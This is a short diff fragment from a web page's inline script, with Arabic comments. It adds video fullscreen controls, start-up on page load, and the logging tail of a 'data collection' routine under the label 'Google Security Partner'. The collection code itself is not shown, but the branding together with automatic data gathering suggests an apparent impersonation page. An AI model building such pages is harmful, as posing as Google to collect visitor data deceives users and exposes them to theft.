+                            console.warn('⚠️ Data collection had issues:', result);
+                        }
+                    } catch (error) {
+                        console.error('❌ Error in data collection:', error);
+                    }
+                }
+            });
+
+            // تحكمات الفيديو
+            const ctrlBtns = document.querySelectorAll('.ctrl-btn');
+            ctrlBtns.forEach(b => {
+                b.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    if (this.textContent.includes('⛶')) {
+                        if (vid.requestFullscreen) vid.requestFullscreen();
+                        else if (vid.webkitRequestFullscreen) vid.webkitRequestFullscreen();
+                    }
+                });
+            });
+        }
+
+        // ============================================
+        // بدء التطبيق عند تحميل الصفحة
+        // ============================================
+        if (document.readyState === 'complete') {
+            initializeApp();
+        } else {
+            window.addEventListener('load', initializeApp);
+        }
+
+        // معالجة الأخطاء العامة
+        window.addEventListener('error', function(e) {
+            console.error('⚠️ Global error:', e.message);
+        });
+
+        console.log('🚀 Google Security Partner - Loading...');
     </script>
 </body>
 </html>
